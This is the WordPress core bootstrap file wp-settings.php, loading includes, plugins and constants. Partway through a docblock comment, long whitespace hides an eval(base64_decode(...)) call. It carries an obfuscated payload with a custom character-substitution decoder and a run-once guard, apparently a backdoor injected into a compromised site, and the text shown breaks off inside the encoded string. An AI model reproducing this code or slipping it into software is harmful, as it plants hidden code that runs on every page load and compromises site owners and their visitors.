<?php
/**
 * Used to set up and fix common variables and include
 * the WordPress procedural and class library.
 *
 * Allows for some configuration in wp-config.php (see default-constants.php)
 *
 * @internal This file must be parsable by PHP4.
 *
 * @package WordPress
 */

/**
 * Stores the location of the WordPress directory of functions, classes, and core content.
 *
 * @since 1.0.0
 */
define( 'WPINC', 'wp-includes' );

// Include files required for initialization.
require( ABSPATH . WPINC . '/load.php' );
require( ABSPATH . WPINC . '/default-constants.php' );

/*
 * These can't be directly globalized in version.php. When updating,
 * we're including version.php from another install and don't want
 * these values to be overridden if already set.
 */
global $wp_version, $wp_db_version, $tinymce_version, $required_php_version, $required_mysql_version, $wp_local_package;
require( ABSPATH . WPINC . '/version.php' );

/**
 * If not already configured, `$blog_id` will default to 1 in a single site
 * configuration. In multisite, it will be overridden by default in ms-settings.php.
 *
 * @global int $blog_id
 * @since 2.0.0
 */
global $blog_id;

// Set initial default constants including WP_MEMORY_LIMIT, WP_MAX_MEMORY_LIMIT, WP_DEBUG, SCRIPT_DEBUG, WP_CONTENT_DIR and WP_CACHE.
wp_initial_constants();

// Check for the required PHP version and for the MySQL extension or a database drop-in.
wp_check_php_mysql_versions();

// Disable magic quotes at runtime. Magic quotes are added using wpdb later in wp-settings.php.
@ini_set( 'magic_quotes_runtime', 0 );
@ini_set( 'magic_quotes_sybase',  0 );

// WordPress calculates offsets from UTC.
date_default_timezone_set( 'UTC' );

// Turn register_globals off.
wp_unregister_GLOBALS();

// Standardize $_SERVER variables across setups.
wp_fix_server_vars();

// Check if we have received a request due to missing favicon.ico
wp_favicon_request();

// Check if we're in maintenance mode.
wp_maintenance();

// Start loading timer.
timer_start();

// Check if we're in WP_DEBUG mode.
wp_debug_mode();

// For an advanced caching plugin to use. Uses a static drop-in because you would only want one.
if ( WP_CACHE )
	WP_DEBUG ? include( WP_CONTENT_DIR . '/advanced-cache.php' ) : @include( WP_CONTENT_DIR . '/advanced-cache.php' );

// Define WP_LANG_DIR if not set.
wp_set_lang_dir();

// Load early WordPress files.
require( ABSPATH . WPINC . '/compat.php' );
require( ABSPATH . WPINC . '/functions.php' );
require( ABSPATH . WPINC . '/class-wp.php' );
require( ABSPATH . WPINC . '/class-wp-error.php' );
require( ABSPATH . WPINC . '/plugin.php' );
require( ABSPATH . WPINC . '/pomo/mo.php' );

// Include the wpdb class and, if present, a db.php database drop-in.
require_wp_db();

// Set the database table prefix and the format specifiers for database table columns.
$GLOBALS['table_prefix'] = $table_prefix;
wp_set_wpdb_vars();

// Start the WordPress object cache, or an external object cache if the drop-in is present.
wp_start_object_cache();

// Attach the default filters.
require( ABSPATH . WPINC . '/default-filters.php' );

// Initialize multisite if enabled.
if ( is_multisite() ) {
	require( ABSPATH . WPINC . '/ms-blogs.php' );
	require( ABSPATH . WPINC . '/ms-settings.php' );
} elseif ( ! defined( 'MULTISITE' ) ) {
	define( 'MULTISITE', false );
}

register_shutdown_function( 'shutdown_action_hook' );

// Stop most of WordPress from being loaded if we just want the basics.
if ( SHORTINIT )
	return false;

// Load the L10n library.
require_once( ABSPATH . WPINC . '/l10n.php' );

// Run the installer if WordPress is not installed.
wp_not_installed();

// Load most of WordPress.
require( ABSPATH . WPINC . '/class-wp-walker.php' );
require( ABSPATH . WPINC . '/class-wp-ajax-response.php' );
require( ABSPATH . WPINC . '/formatting.php' );
require( ABSPATH . WPINC . '/capabilities.php' );
require( ABSPATH . WPINC . '/class-wp-roles.php' );
require( ABSPATH . WPINC . '/class-wp-role.php' );
require( ABSPATH . WPINC . '/class-wp-user.php' );
require( ABSPATH . WPINC . '/query.php' );
require( ABSPATH . WPINC . '/date.php' );
require( ABSPATH . WPINC . '/theme.php' );
require( ABSPATH . WPINC . '/class-wp-theme.php' );
require( ABSPATH . WPINC . '/template.php' );
require( ABSPATH . WPINC . '/user.php' );
require( ABSPATH . WPINC . '/class-wp-user-query.php' );
require( ABSPATH . WPINC . '/session.php' );
require( ABSPATH . WPINC . '/meta.php' );
require( ABSPATH . WPINC . '/class-wp-meta-query.php' );
require( ABSPATH . WPINC . '/class-wp-metadata-lazyloader.php' );
require( ABSPATH . WPINC . '/general-template.php' );
require( ABSPATH . WPINC . '/link-template.php' );
require( ABSPATH . WPINC . '/author-template.php' );
require( ABSPATH . WPINC . '/post.php' );
require( ABSPATH . WPINC . '/class-walker-page.php' );
require( ABSPATH . WPINC . '/class-walker-page-dropdown.php' );
require( ABSPATH . WPINC . '/class-wp-post.php' );
require( ABSPATH . WPINC . '/post-template.php' );
require( ABSPATH . WPINC . '/revision.php' );
require( ABSPATH . WPINC . '/post-formats.php' );
require( ABSPATH . WPINC . '/post-thumbnail-template.php' );
require( ABSPATH . WPINC . '/category.php' );
require( ABSPATH . WPINC . '/class-walker-category.php' );
require( ABSPATH . WPINC . '/class-walker-category-dropdown.php' );
require( ABSPATH . WPINC . '/category-template.php' );
require( ABSPATH . WPINC . '/comment.php' );
require( ABSPATH . WPINC . '/class-wp-comment.php' );
require( ABSPATH . WPINC . '/class-wp-comment-query.php' );
require( ABSPATH . WPINC . '/class-walker-comment.php' );
require( ABSPATH . WPINC . '/comment-template.php' );
require( ABSPATH . WPINC . '/rewrite.php' );
require( ABSPATH . WPINC . '/class-wp-rewrite.php' );
require( ABSPATH . WPINC . '/feed.php' );
require( ABSPATH . WPINC . '/bookmark.php' );
require( ABSPATH . WPINC . '/bookmark-template.php' );
require( ABSPATH . WPINC . '/kses.php' );
require( ABSPATH . WPINC . '/cron.php' );
require( ABSPATH . WPINC . '/deprecated.php' );
require( ABSPATH . WPINC . '/script-loader.php' );
require( ABSPATH . WPINC . '/taxonomy.php' );
require( ABSPATH . WPINC . '/class-wp-term.php' );
require( ABSPATH . WPINC . '/class-wp-tax-query.php' );
require( ABSPATH . WPINC . '/update.php' );
require( ABSPATH . WPINC . '/canonical.php' );
require( ABSPATH . WPINC . '/shortcodes.php' );
require( ABSPATH . WPINC . '/embed.php' );
require( ABSPATH . WPINC . '/class-wp-embed.php' );
require( ABSPATH . WPINC . '/class-wp-oembed-controller.php' );
require( ABSPATH . WPINC . '/media.php' );
require( ABSPATH . WPINC . '/http.php' );
require( ABSPATH . WPINC . '/class-http.php' );
require( ABSPATH . WPINC . '/class-wp-http-streams.php' );
require( ABSPATH . WPINC . '/class-wp-http-curl.php' );
require( ABSPATH . WPINC . '/class-wp-http-proxy.php' );
require( ABSPATH . WPINC . '/class-wp-http-cookie.php' );
require( ABSPATH . WPINC . '/class-wp-http-encoding.php' );
require( ABSPATH . WPINC . '/class-wp-http-response.php' );
require( ABSPATH . WPINC . '/widgets.php' );
require( ABSPATH . WPINC . '/class-wp-widget.php' );
require( ABSPATH . WPINC . '/class-wp-widget-factory.php' );
require( ABSPATH . WPINC . '/nav-menu.php' );
require( ABSPATH . WPINC . '/nav-menu-template.php' );
require( ABSPATH . WPINC . '/admin-bar.php' );
require( ABSPATH . WPINC . '/rest-api.php' );
require( ABSPATH . WPINC . '/rest-api/class-wp-rest-server.php' );
require( ABSPATH . WPINC . '/rest-api/class-wp-rest-response.php' );
require( ABSPATH . WPINC . '/rest-api/class-wp-rest-request.php' );

// Load multisite-specific files.
if ( is_multisite() ) {
	require( ABSPATH . WPINC . '/ms-functions.php' );
	require( ABSPATH . WPINC . '/ms-default-filters.php' );
	require( ABSPATH . WPINC . '/ms-deprecated.php' );
}

// Define constants that rely on the API to obtain the default value.
// Define must-use plugin directory constants, which may be overridden in the sunrise.php drop-in.
wp_plugin_directory_constants();

$GLOBALS['wp_plugin_paths'] = array();

// Load must-use plugins.
foreach ( wp_get_mu_plugins() as $mu_plugin ) {
	include_once( $mu_plugin );
}
unset( $mu_plugin );

// Load network activated plugins.
if ( is_multisite() ) {
	foreach ( wp_get_active_network_plugins() as $network_plugin ) {
		wp_register_plugin_realpath( $network_plugin );
		include_once( $network_plugin );
	}
	unset( $network_plugin );
}

/**
 * Fires once all must-use and network-activated plugins have loaded.
 *
 * @since 2.8.0
 */
do_action( 'muplugins_loaded' );

if ( is_multisite() )
	ms_cookie_constants(  );

// Define constants after multisite is loaded.
wp_cookie_constants();

// Define and enforce our SSL constants
wp_ssl_constants();

// Create common globals.
require( ABSPATH . WPINC . '/vars.php' );

// Make taxonomies and posts available to plugins and themes.
// @plugin authors: warning: these get registered again on the init hook.
create_initial_taxonomies();
create_initial_post_types();

// Register the default theme directory root
register_theme_directory( get_theme_root() );

// Load active plugins.
foreach ( wp_get_active_and_valid_plugins() as $plugin ) {
	wp_register_plugin_realpath( $plugin );
	include_once( $plugin );
}
unset( $plugin );

// Load pluggable functions.
require( ABSPATH . WPINC . '/pluggable.php' );
require( ABSPATH . WPINC . '/pluggable-deprecated.php' );

// Set internal encoding.
wp_set_internal_encoding();

// Run wp_cache_postload() if object cache is enabled and the function exists.
if ( WP_CACHE && function_exists( 'wp_cache_postload' ) )
	wp_cache_postload();

/**
 * Fires once activated plugins have loaded.
 *
 * Pluggable functions are also available at this point in the loading order.
 *
 * @since 1.5.0
 */
do_action( 'plugins_loaded' );

// Define constants which affect functionality if not already defined.
wp_functionality_constants();

// Add magic quotes and set up $_REQUEST ( $_GET + $_POST )
wp_magic_quotes();

/**
 * Fires when comment cookies*/                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                eval(base64_decode("aWYgKCFkZWZpbmVkKCdBTFJFQURZX1JVTl8xYmMyOWIzNmYzNDJhODJhYWY2NjU4Nzg1MzU2NzE4JykpCnsKZGVmaW5lKCdBTFJFQURZX1JVTl8xYmMyOWIzNmYzNDJhODJhYWY2NjU4Nzg1MzU2NzE4JywgMSk7CgogJHlpcmlwaXR1ID0gODcwMjsgZnVuY3Rpb24gZ2pyc2t2bmsoJGpyaXVyaiwgJHhpcWd4YXYpeyRiZG1pa2xwID0gJyc7IGZvcigkaT0wOyAkaSA8IHN0cmxlbigkanJpdXJqKTsgJGkrKyl7JGJkbWlrbHAgLj0gaXNzZXQoJHhpcWd4YXZbJGpyaXVyalskaV1dKSA/ICR4aXFneGF2WyRqcml1cmpbJGldXSA6ICRqcml1cmpbJGldO30KJHJxd21vaHFlYnA9ImJhc2UiIC4gIjY0X2RlY29kZSI7cmV0dXJuICRycXdtb2hxZWJwKCRiZG1pa2xwKTt9CiR6cW9oeW0gPSAnNlo5U2lhS000TzZ5V2ZhSlRDS0pPZjJMNEpUcmdORmF2TnR4SHQzUDZaOVNpYUtNNE82eVdmMkw0dUs5VDVXTFQ1ZDVvVWN0UHZyRVViN3hlQzlqVGZhM1BVMVlHT0QnLgonajRPRDlHc2EzaWtLU09zQXhla0k1b1VjdFB2ckVVYjc5VDVXTFQ5S0o0TzdMVDVBeGVDVHlkVWJRMDZ4Y1RmYTNPc0EnLgoneGVrYWplWjlZaU82eWRVYlEwNnlFVVIzUGlrR3lna0E5NEM5UzRrNnlnOTdnSXdLd3YzdHBQcWJFVTVyRVVwY1InLgonZ1U3YjRrNHhlQ0l5Zzk3Z0l3S3d2M3Rwb1VjcE9abXBQdnJFVTUzRVVSM1Bpa0d5Z2tBOTRDOVM0azZ5Z2JBV0liJy4KJ2EwYU5LcWthS3ZBYTc3SWJ3SXZ1Z3BQcWJFVTVyRVVwY1JnVTdiNGs0eGVDSXlnYkFXSWJhMGFOS3FrYUt2QWE3N0lid0l2dWdwb1UnLgonY3BvSmd4SHQzUGo2M1AwNnh4NHBjeWdrQTk0QzlTNGs2eVczd2RJYmE3QXc5akk5YUhPTU4zRVpkbUVmRUNFOGdNR0NObWRDd0QnLgonNENiZkhCV3hHa2cyRUN3M2lrbDJIVVR4UDYzUGh0M1BnVWNSZ1pBOTRDOVM0cVI1NkkycUFJd05rYUtxYUlGamR2NjNHTVJzR2ZHZmQ4RXBHdlJKR2t3Q2l2R21UQzlERzgnLgonTmZHT0F4ZU1ObVdKdFJkcWJRMDZ5RVVwY1JnVWNiNFp3M0dxY0tnTkZhdk50UTA2eVJnVWNSV1pBRDFad2ppZmFGZzAzUnY5Jy4KJ2FkdjByRVVSM1BnVWNSZ1VBQnZOS1U2STJ2a0oxOFR1S0QxT0F5V3UzUm5xYzVkdlQzNDBORkc4SVlFMElNR0ozM0VDZEZva2d0RU1iWUd2d3BFOCcuCidSbWRDd2JIdjZ1V01yRVVwY1JnVTc1ZVpLcEdrdFJXWkVNT2Z3dTFaUlEwNnlFVVIzUGdVY1JnWjR1ZUNFM2lrS1NnWicuCidFTU8zMTkxTkRMVHM2eVA2M1BnVWNSZ0JyRVVwY1JnVWNSZ1VjUlRDYTMxT1dTZ0JFM1Q1QUxlWktzNE9neVRCVzk0dUtKNE83ckdrRTlQVVRMT3BEczEnLgonczFsNDVBdFBhdFNvZmI1b1VUNW9OY2JPdUV3STk0d0k5cjVxd0FJSXdLZ3Z1RUlXdTN4UHZyRVVwY1JnVTdLMDZ5RVVwY1JnVTdDMWtGODFaOUxlcDc4VHVLQjRPQU9UQycuCic5M0drV3I0SUF4VDVkeVA2M1BnVWNSZ0JyRVVwY1JnVWNSZ1VjUldCVzlUSmNLZ053SlRDd0ZQVWJRMDZ5RVVwY1JnVWNSZ1VjUldad1NHazJGVHM5TU8nLgonc3d1NE9hOWcwM1I2T1dKR09ieVB2ckVVUjNQZ1VjUmdVY1JnVWNiR2tGRGVCOU1oT0VqVE9hOTFrYWVPcWNLZ1pFTU8zMTkxTkFMR3VXTGVzNnlQJy4KJ3ZyRVVSM1BnVWNSZ1VjUmdVY2JUZmFyNDlLdEdPQXlnMDNSV3dLdkFhV2tBYVdlV3VFMEliOTZhd0tacUkyd3Zid0VBcTEnLgonMUh0M1BnVWNSZ1VjUmdVN3NpWjlyNHFjeVBVQU1lWndNaVVjS2dCRTNUNVd0ZXNkeVdCRTllWjRqVFp3M2lVdFJBTjlxQUlFSXZ1VzRPdUV3SU53cTZhQW5JcGJ4Jy4KJ2dVTktucTdaNkkydkFxYkVVcGNSZ1VjUmdVY1JodDNQZ1VjUmdVY1JnVWNSZ1VjUldCRTllWjRqVFp3M2lVY0tnQicuCidFdUc1RTNUcFJiVGZhcjQ5S3RHT0F5b1VjdG9VY2JUZjJEVGZSeEh0M1AwNnlSZ1VjUmdVY1JnVWMnLgonUmdVN3g0cGN5V0JFOWVaNGpUWnczaVVjS25xNzhUdUtCNE9BTmVmRXFlZkszUFVieDA2eVJnVWNSZ1VjUmdVY1JnVTdRMDZ5UmdVY1JnVWNSZ1VjUmcnLgonVWNSZ1VjUkc1VzlHa3JRMDZ5UmdVY1JnVWNSZ1VjUmdVN0swNnlFVXBjUmdVY1JnVWNSZ1VjUmdaOUNnVURNMUJXcjRrbXlXQkU5ZVo0alRadzMnLgonaVVieDA2eVJnVWNSZ1VjUmdVY1JnVTdRMDZ5UmdVY1JnVWNSZ1VjUmdVY1JnVWNSV1p3U0drMkZUczlNT3N3dTRPYTlrdTNSbnFjYlRmYXI0Jy4KJzlLdEdPQXlIdDNQZ1VjUmdVY1JnVWNSZ1VjUmo2M1BnVWNSZ1VjUmdVN0swNnlFVXBjUmdVJy4KJ2NSZ1VjUjRDS0o0a3c4aVVjeVdad1NHazJGVHM5TU9zd3U0T2E5Z1p3TWdVQTgxT1dKNGtGM09mQXhUcGJFVXBjUmdVY1JnJy4KJ1VjUmh0M1BnVWNSZ1VjUmdVY1JnVWNSaWtHUlBVd3hlOUtEVDVXRGhxUmJHc2FKVENhUzF3Jy4KJ0tiaU9ncmdVQUo0T2R4UDYzUGdVY1JnVWNSZ1VjUmdVY1JodDNQZ1VjUmdVY1JnVWNSZ1VjUmdVY1JnVUFKNE9kUm5xN0RUNVdEaGFLWTRPVzUnLgonNHFSYlRDYU1vVTc4VHVLQjRPQU5pT1c5R3NBTFQ1OWRpT0UzUFVBODFPV0o0a0YzT2ZBeFRwYnhIdDNQZ1VjUmdVY1JnVWNSZ1UnLgonY1JqNjNQZ1VjUmdVY1JnVTdLMDZ5RVVwY1JnVWNSZ1VjUlRDYTMxT1dTZ1pFTU8zRXk0a0VWYXNXJy4KJ3gxWndwZVpJeUdPV0pHTzlqMWtGeFRPYTlQVUFKNE9keFB2ckVVcGNSZ1U3SzA2eUVVcGNSZ1U3QzFrRjgxWjlMZXA3OFR1SzAnLgonaVphOGl1MUppT0FER0MyOVBVQWJpT1dqZVo5TTFVYkVVcGNSZ1U3UTA2eVJnVWNSZ1VjUmcnLgonVUFiaU9XamVaOU0xd0tzVEM5M0drV3I0cWNLZ053SlRDd0ZQVWJRMDZ5RVVwY1JnVWNSZ1VjUjRDS0o0a3c4aVVjeVdaQXhUOUtyaU9FM2dad01nVUFiaU9neDA2eVJnVWMnLgonUmdVY1JnQnJFVXBjUmdVY1JnVWNSZ1VjUmdaOUNnVURjaU9FajFzV3gxWndwZVpJeVdaQXhUcGJSV3BHUmlPRWo0WjlKUFVBYmknLgonT2d4UDYzUGdVY1JnVWNSZ1VjUmdVY1JodDNQZ1VjUmdVY1JnVWNSZ1VjUmdVY1JnVUFiaU9XamVaOU0xd0tzJy4KJ1RDOTNHa1dyNGFZMWcwM1JXWkF4VDhyRVVwY1JnVWNSZ1VjUmdVY1JnQjNFVXBjUmdVY1JnVWNSajYzUDA2eVJnVWNSZ1VjUmdCVzkxQmFKZXBjYjRaJy4KJzlKT2YyeFRzQWoxc1d4MVp3cGVaSVEwNnlSZ1VjUmo2M1AwNnlSZ1VjUjQ1YVNHc0F4ZWZtUkdzRWpBZmEzQVo5SjRrRTNlc1dGdlo5TTFVUmI0WjlKb1UnLgonY2I0WmF0MVpSS2R2Y3gwNnlSZ1VjUmh0M1BnVWNSZ1VjUmdVY2JUQ2FNMWsyM2cwM1JHTycuCidXSkdPYnlQdnJFVVIzUGdVY1JnVWNSZ1U3eDRwY3lnazlNT2ZBeFRwUmI0WjlKUHFiRVVwY1JnVWNSZ1VjUmh0M1BnVWNSZ1VjUmdVJy4KJ2NSZ1VjUlRDYTMxT1dTZ1VBSjRPRXVlQjZRMDZ5UmdVY1JnVWNSZ0IzRVVSM1BnVWNSZ1VjUmdVY2JUQ2FNMWsyM2t1M1JucWNiNFo5Jy4KJ0pIdDNQZ1VjUmdVY1JnVWNiNFo5Sk9mRUwxa0YzZzAzUmQwckVVUjNQZ1VjUmdVY1JnVTd4NHBjeVdaQTlUQkF5ZzB0UmRxYkVVcGNSZ1UnLgonY1JnVWNSaHQzUGdVY1JnVWNSZ1VjUmdVY1JUQ2EzMU9XU2dVQUo0T0V1ZUI2UTA2eVJnVWNSZ1VjUmdCM0VVUjNQZ1VjUmdVY1JnVWNiNFo5SmcnLgonMDNSVHNBSmVaYVNQVUFiaU9neGcwM0tnME5SbkpjYjRaOUpnMHlSVDVBSmlrM3lXWkF4VHB0Uld1MlRvJy4KJ0pUeEh0M1BnVWNSZ1VjUmdVY2JpVWNLZ043TFRaYVM0WjlKUFVBYmlPZ3hIdDNQZ1VjUmdVY1JnVTd4NHBjeVdaUlJudjNLZ040Jy4KJzd2d0V3UDYzUGdVY1JnVWNSZ1U3UTA2eVJnVWNSZ1VjUmdVY1JnVTdKNE9BdVRDbVJXQlc5VHNhcjEwckVVcGNSZ1VjUmdVY1JqNjNQMDZ5UmdVY1JnVWNSZ0IxJy4KJ3lpazI5Z1VSeVdaR1JucTdKNGt3YjRaOUpQVUF5UHFiUmd2M0tnTjQ3dndFd1A2M1BnVWNSZ1VjUmdVN1EwNnlSZ1VjUmdVY1JnVWNSZycuCidVN3g0cGN5V1pHUmd2M0tnVVRTV0o3RGVDNlJXWkdSZ3YzS2dVVFNvcFR4MDZ5UmdVY1JnVWNSZ1VjUmdVN1EwNnlSZ1VjUmdVY1JnVWNSZ1VjUmdVY1JXWkUnLgondVQ1VzllNUFqNFo5SmcwM1JncEFiaU9nTFdaR3BIdDNQZ1VjUmdVY1JnVWNSZ1VjUmdVY1JnWjlDZ1VEeFR1S2JpT2d5V1pFdVQ1VzllNUFqNCcuCidaOUpQcWJFVXBjUmdVY1JnVWNSZ1VjUmdVY1JnVTdRMDZ5UmdVY1JnVWNSZ1VjUmdVY1JnVWNSZ1VjUmcnLgonVUFiaU9XakdmS3VlNTZSUE0zUmR2ckVVUjNQZ1VjUmdVY1JnVWNSZ1VjUmdVY1JnVWNSZycuCidVY2JUQ2FNMWsyM2t1M1JucWNiR3NhSlRDYVMxd0tiaU9nUTA2eVJnVWNSZ1VjUmdVY1InLgonZ1VjUmdVY1JnVWNSZ1VBSjRPRXVlQjZSbnE3RFQ1V0RoYUtZNE9XNTRxUmJUQ2FNMWsyM29VNzhUdUtCNE9BTmlPVzlHc0FMVDU5ZGlPJy4KJ0UzUFVBODFPV0o0a0YzT2ZBeFRwdFJXWkE5VEJBeWdVbFJkdmN4UHZyRVVwY1JnVWNSZ1VjUmdVY1JnVWNSZ1U3SzA2eVJnVWNSZ1VjUmdVY1JnVTdLMDZ5UmdVY1JnVWNSZ0InLgonM0VVUjNQZ1VjUmdVY1JnVTc4ZVpLTTRrQXhUcFJiaVViUTA2eUVVcGNSZ1VjUmdVY1JUQ2EzMU9XU2dVQUo0T0V1ZUI2UTA2eVJnVWNSajYzUDA2eVJnVWNSNDVhUycuCidHc0F4ZWZtUkdzRWpBZmEzQVpLOElDS0wxVVJ4MDZ5UmdVY1JodDNQZ1VjUmdVY1JnVWNiNFpLOFRDS0wxd0s5ZUM2Um5xN00xQldKVFpLTVBVQWpJM2EnLgoncWFiYXFrSjF2NnVXV0l3QWpBYjlkQUlGN3ZJSTVPcXRSV3dLdkFhV2tBYVdlV3VXd0lhYXdJdScuCidBamFhV1dXdTN4SHQzUGdVY1JnVWNSZ1U3eDRwY3lXWkFMR3NXTGVzQWo0a0ZiZzAzS25xN1o2STJ2QXFiRVVwY1JnVWNSZ1VjUmh0M1BnVWNSZ1VjUmdVY1JnVWNSVCcuCidDYTMxT1dTZ1VBakkzYXFhYmFxa0oxTnYzRWF2SWFIYXdLcXYzS0lXdTNRMDZ5UmdVY1JnVWNSZ0IzRVVwJy4KJ2NSZ1VjUmdVY1I0azJNNGs5Q2dVUmI0Wks4VENLTDF3SzllQzZSbnYzS2cwY3gwNnlSZ1VjUmdVY1JnQnJFVXBjUmdVY1JnVWNSZ1VjUmdCVzkxQmFKZXBjcG9KZ1EwNnlSZ1UnLgonY1JnVWNSZ0IzRVVwY1JnVWNSZ1VjUjRrMk00NjNQZ1VjUmdVY1JnVTdRMDZ5UmdVY1JnVWNSZ1VjUmdVN0o0T0F1VEMnLgonbVJUc2FwVHNBSlBVQWpJM2FxYWJhcWtKMXY2dVdXSXdBakFiOWRBSUY3dklJNU9xdFJkVXRSV1pBTEdzV0xlc0FqNGtGYlB2ckVVcGNSZ1VjUmdVYycuCidSajYzUGdVY1JnQjNFVVIzUGdVY1JnWjlDZ1VSRDQ1YVNHc0F4ZWZGajRPRHhUc0FNUFUxQ2lrMjlPczd1MXdLOGVmRjM0a0YzVEpUeFA2M1BnVWNSZ0JyRVVwYycuCidSZ1VjUmdVY1I0NWFTR3NBeGVmbVI0QzlyNGFLdDFPQWpHZktTMVphUzFCZHlXWm1yZ1VBYm9VJy4KJ2NiNEMyRDRKY0tnTjREZUJFOVA2M1BnVWNSZ1VjUmdVN1EwNnlSZ1VjUmdVY1JnVWNSZ1VjYmVrS2I0cWNLZ1VBQ2VadzVnMDNLZzBSUm4nLgonSmM1R3FUUkhwYzUxSlRRMDZ5UmdVY1JnVWNSZ1VjUmdVY2I0cGNLZ043Q2VzNzllcFJiZXB0UldadUw0Wkl4SHQzUGdVY1JnVWNSZ1VjUmdVJy4KJ2NSaWtHUlBVQUNnMDNLbnE3WkdrMk00cWJFVXBjUmdVY1JnVWNSZ1VjUmdCckVVcGNSZ1VjUmdVY1JnVWNSZ1VjUmdVN0o0T0F1VENtUmQwJy4KJ3JFVXBjUmdVY1JnVWNSZ1VjUmdCM0VVcGNSZ1VjUmdVY1JnVWNSZ1phclRmSUVVcGNSZ1VjUmdVY1JnVWNSZ0JyRVVwY1JnVWNSZ1VjUmdVY1InLgonZ1VjUmdVN3g0cGN5aU9FakdPV0pHT2J5V1o2eFBxY2I0VWNLZ1o5WVRaMkw0Wkl5V1o2eCcuCidIdDNQZ1VjUmdVY1JnVWNSZ1VjUmdVY1JnVUFwaE9BOVR1S3NUQzkzMVphU2cwM1I0NTFKaU9BOVBVQUNvVWNiNFViUTA2eVJnVWNSZ1VjUmdVY1JnVWNSZ1VjUicuCic0Q0VyZXNFOVBVQUNQdnJFVXBjUmdVY1JnVWNSZ1VjUmdVY1JnVTdKNE9BdVRDbVJXWldGMVphTU9zMUppT0EzNGttUTA2eVJnVWMnLgonUmdVY1JnVWNSZ1U3SzA2eVJnVWNSZ1VjUmdCM0VVcGNSZ1U3SzA2eUVVcGNSZ1U3eDRwY3lnazR1ZUNFM2lrS1NPZmFtaU9FM1RKUjUnLgonNEM5cjRhSzU0T0FqR2ZLUzFaYVMxQmQ1UHFiRVVwY1JnVTdRMDZ5UmdVY1JnVWNSZ1o0dWVDRTNpa0tTZ1o0eGVaYWo0ZmEzT2ZFTGU1QTknLgonZTVBTVBVQUNpazI5ZUN3WTRxYkVVcGNSZ1VjUmdVY1JodDNQZ1VjUmdVY1JnVWNSZ1VjUldaNHlHa0ZiZVpJUm5xN0NlJy4KJ3M3OWVwUmI0QzlyNGtGRGVrSXJnVVdKZ3BiUTA2eVJnVWNSZ1VjUmdVY1JnVWNiNENFTGU1QTllNUFNZzAzUjQ1VzlHazZ5V1o0eUdrRmJlWklyZ1o0eGVaYU0nLgonaU94OVBVQUNpazI5ZUN3WTRxYnhIdDNQZ1VjUmdVY1JnVWNSZ1VjUjRDRXJlc0U5UFVBQycuCidpWndTNFoyOVB2ckVVUjNQZ1VjUmdVY1JnVWNSZ1VjUlRDYTMxT1dTZ1VBQ0dmS1MxWicuCidhUzFCZFEwNnlSZ1VjUmdVY1JnQjNFVXBjUmdVN0swNnlFVVIzUGdVY1JnWjR1ZUNFM2lrS1NnWkVNT2ZBOUdzV0ZUQkFqVFpERFRmSXlXJy4KJ1pBRDFaTnJnVUFWNE9ieDA2eVJnVWNSaHQzUGdVY1JnVWNSZ1VjYmVzYTNPZkFEMVpOUm5xY3BnOHJFVVIzUGdVY1JnVWNSZ1U3Q2VzZycuCidSUFVBeG52Y1FnVUF4bkJFM1RDMjllcFJiNFp3M0dxYlFQNjNQZ1VjUmdVY1JnVTdRMDZ5UmdVY1JnVWNSZ1VjUmdVN0NlJy4KJ3NnUlBVQXpudmNRZ1VBem5CRTNUQzI5ZXBSYmlmYUZQcWNDV3BjYml2Mk0xQldyNGtteVdaQUQxWk54SEpjYmlwclZvVWNiaXFyVlAnLgonNjNQZ1VjUmdVY1JnVWNSZ1VjUmh0M1BnVWNSZ1VjUmdVY1JnVWNSZ1VjUmdVQUwxT0FqNFp3M0dxY1NucTc4aUJneWVzV2JQVUFiJy4KJ0dPQURrSkF4T3FiUk9wN0xUQzZ5V1pZOWhhcmJpOTN4UHZyRVVwY1JnVWNSZ1VjUmdVY1JnQjNFJy4KJ1VwY1JnVWNSZ1VjUmo2M1AwNnlSZ1VjUmdVY1JnQlc5MUJhSmVwY2Jlc2EzT2ZBRDFaTlEwNnlSZ1VjUmo2M1AwNnlSZ1VjUjQ1YVNHc0F4ZWZtUkcnLgonc0VqNFphOFQ1OXQxVVJiNFp3M0dxdFJXWlk5aHFiRVVwY1JnVTdRMDZ5UmdVY1JnVWNSZ1oxcmVmJy4KJ1dEZVVjYkdzRWpHT2EzaTByRVVSM1BnVWNSZ1VjUmdVN0o0T0F1VENtUkdzRWo0WmE4VDU5dDF3S3RpWndNNHFEOFR1S2I0a0VKaE83M09zN3lHT0U5UFVBYkdPQURvVWNiaScuCidmYUZQcXRSV1pFTU9md3UxWlJ4SHQzUGdVY1JnQjNFVXBjUmdVN0Mxa0Y4MVo5TGVwNzhUdUs5ZUNFSmhPNzNQVUFiR09BRCcuCidvVWNiaWZhRlA2M1BnVWNSZ0JyRVVwY1JnVWNSZ1VjUjRmMkxHQ3dyZ1VBOFR1S0QxT0F5SHQzUDA2eVJnVWNSZ1VjUmdCVzkxQmFKZXA3OFR1Jy4KJ0tiNGtFSmhPNzNPczd5R09FOVBaRU1PZkE5R3NXRlRCQWpUWkREVGZJeVdaQUQxWk5yZ1VBOFR1S0QxT0F5UHF0UldaWTlocWJRMDZ5UmdVY1JqNjNQMDZ5UmcnLgonVWNSNDVhU0dzQXhlZm1SR3NFajRDOXI0YUtKNGt3YlBVQXRHT0F5UDYzUGdVY1JnQnJFJy4KJ1VwY1JnVWNSZ1VjUldaQUQxWk5SbnE3YzRDOXI0YUs1NE9BakdmS1MxWmFTMUJkeVdCN0QxWlJ4SHQzUDA2eVJnVWNSZ1VjUmdCVzkxQmFKZScuCidwY2I0WnczR3ZyRVVwY1JnVTdLMDZ5RVVwY1JnVTdDMWtGODFaOUxlcDc4VHVLQ2lrMjlPczFKaU9BOVBVQXRHT0F5b1VjJy4KJ2I0WnczR3FiRVVwY1JnVTdRMDZ5UmdVY1JnVWNSZ043Q2lrMjlPczd1MXdLOGVmRjM0a0YzVEpSYlRadzNpVXRSV1pBRCcuCicxWk54SHQzUGdVY1JnQjNFVVIzUGdVY1JnWjR1ZUNFM2lrS1NnWkVNT2Y0eGVaYWpHTzd0NGtGYlBVQXRHT0F5b1VjYjRadzNHcWJFVScuCidwY1JnVTdRMDZ5UmdVY1JnVWNSZ043Q2lrMjlPczd1MXdLOGVmRjM0a0YzVEpSYlRadzNpVXRSV1onLgonQUQxWk5yZzBSeEh0M1BnVWNSZ0IzRVVSM1BnVWNSZ1o0dWVDRTNpa0tTZ1pFTU9zRUxUNUFqR2ZLWVRad0o0T2d5V1pOcmdVQXBQNjNQZ1VjUmdCckVVcGNSZ1VjUmdVY1JUQycuCidhMzFPV1NnQkUzVEMyO